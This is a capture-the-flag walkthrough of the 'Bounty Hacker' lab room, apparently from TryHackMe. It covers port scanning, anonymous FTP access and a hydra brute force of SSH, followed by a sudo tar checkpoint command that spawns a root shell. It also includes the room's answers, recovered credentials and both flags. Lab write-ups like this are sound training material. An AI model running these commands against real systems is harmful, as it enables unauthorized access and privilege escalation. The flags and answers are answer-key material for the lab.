# Bounty Hacker

## Scope

### Target IP

10.66.158.54

---

# PTES Phase 1 - Enumeration

## Nmap

### Command

```bash
nmap -sC -sV -p- 10.66.158.54
```

### Parameters

* `-sC`: Equivalent to `--script=default`
* `-sV`: Determine service and version information
* `-p-`: Scan all TCP ports

### Purpose

Identify the attack surface exposed by the target host.

### Results

| Port | Service | Version             |
| ---- | ------- | ------------------- |
| 21   | FTP     | vsftpd 3.0.5        |
| 22   | SSH     | OpenSSH 8.2p1       |
| 80   | HTTP    | Apache httpd 2.4.41 |

### Analysis

Three services were exposed:

* FTP may allow anonymous access or contain sensitive files.
* SSH may become useful if credentials are obtained.
* HTTP may expose hidden content or vulnerable applications.

### PTES

Information Gathering

### MITRE ATT&CK

T1046 - Network Service Discovery

---

## Gobuster

### Command

```bash
gobuster dir -u http://10.66.158.54 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js -t 40 -o scans/gobuster-http-ext.txt
```

### Purpose

Enumerate hidden directories and files exposed by the web server.

### Results

No relevant findings.

### Analysis

Although no useful content was discovered, this step was important to validate whether the HTTP service exposed hidden functionality.

Negative results are still valuable because they eliminate potential attack paths.

### PTES

Information Gathering

### MITRE ATT&CK

T1046 - Network Service Discovery

---

## FTP Enumeration

### Command

```bash
nmap -Pn -sV -p21 --script ftp-anon,ftp-syst 10.66.158.54 -oN scans/ftp-scripts.txt
```

### Purpose

Determine whether anonymous authentication is enabled and gather FTP service information.

### Results

```text
ftp-anon: Anonymous FTP login allowed
```

### Analysis

Anonymous FTP access is often a security weakness because it may expose sensitive information without requiring authentication.

### PTES

Vulnerability Analysis

### MITRE ATT&CK

T1046 - Network Service Discovery

---

## FTP Access

### Command

```bash
ftp 10.66.158.54
```

### Authentication

```text
Username: anonymous
Password: <blank>
```

### Results

Two files were discovered:

```text
locks.txt
task.txt
```

Both files were downloaded using:

```bash
get task.txt
get locks.txt
```

---

## task.txt Analysis

### Command

```bash
cat task.txt
```

### Contents

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

### Analysis

The note appears to have been written by a user named:

```text
lin
```

This provides a potential username for later authentication attempts.

### Room Question

Who wrote the task list?

Answer:

```text
lin
```

---

## locks.txt Analysis

### Command

```bash
cat locks.txt
```

### Analysis

The file contains a list of password candidates following a common theme.

Examples:

```text
RedDr4gonSynd1cat3
R3DDr46ONSYndIC@Te
Dr@gOn$yn9icat3
...
```

The naming convention strongly suggests a custom password list created by a user rather than a generic leaked wordlist.

Because the username "lin" had already been identified, this list became an excellent candidate for targeted credential attacks against SSH.

### Room Question

What service can you bruteforce with the text file found?

Answer:

```text
SSH
```

---

# PTES Phase 2 - Exploitation

## SSH Password Attack

### MITRE ATT&CK

T1110 - Brute Force

T1021.004 - Remote Services: SSH

### Command

```bash
hydra -l lin -P locks.txt ssh://10.66.158.54 -t 4 -V -o scans/hydra-ssh.txt
```

### Purpose

Test whether any password present in the recovered wordlist matches the user account discovered during enumeration.

### Results

Valid credentials recovered:

```text
Username: lin
Password: RedDr4gonSynd1cat3
```

### Analysis

This attack succeeded because sensitive information stored on the FTP server revealed a password list closely related to user-created credentials.

This demonstrates how information disclosure can directly lead to account compromise.

### Impact

Remote interactive access obtained.

### Room Question

What is the user's password?

Answer:

```text
RedDr4gonSynd1cat3
```

---

## SSH Access

### Command

```bash
ssh lin@10.66.158.54
```

### Credentials

```text
lin
RedDr4gonSynd1cat3
```

### Results

A successful SSH session was established.

The file:

```text
user.txt
```

was discovered.

### User Flag

```text
THM{CR1M3_SyNd1C4T3}
```

At this point initial compromise was achieved and the assessment moved into the post-exploitation and privilege escalation phases.

# PTES Phase 4 - Privilege Escalation

## Objective

Escalate privileges from the compromised user account (`lin`) to root.

---

## Privilege Enumeration

### Command

```bash
sudo -l
```

### Purpose

Identify commands that the current user can execute with elevated privileges.

### Results

```text
User lin may run the following commands on ip-10-66-158-54:
    (root) /bin/tar
```

### Analysis

The user `lin` was allowed to execute the `tar` binary as root through sudo.

While `tar` is commonly used for archiving files, it also contains functionality that can execute arbitrary commands through checkpoint actions.

This configuration represents a privilege escalation opportunity.

### PTES Phase

Privilege Escalation

### MITRE ATT&CK

T1548 - Abuse Elevation Control Mechanism

---

## GTFOBins Research

### Resource

GTFOBins

### Purpose

Determine whether the permitted binary (`tar`) can be abused to execute commands with elevated privileges.

### Findings

GTFOBins documents a technique that allows `tar` to execute arbitrary commands when run with sudo privileges.

Reference command:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---

## Root Shell Acquisition

### Command

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### Result

A root shell was successfully spawned.

### Verification

```bash
whoami
```

Output:

```text
root
```

### Analysis

Because `tar` was executed as root via sudo, the spawned shell inherited root privileges.

This resulted in full system compromise.

### MITRE ATT&CK

T1548 - Abuse Elevation Control Mechanism

---

## Root Flag

### Commands

```bash
cd /root
ls
cat root.txt
```

### Result

The root flag was successfully recovered.

THM{80UN7Y_h4cK3r}

### Impact

Complete compromise of the target host was achieved.

The attacker gained unrestricted administrative access to the operating system, including access to all files, services, credentials, and configurations.
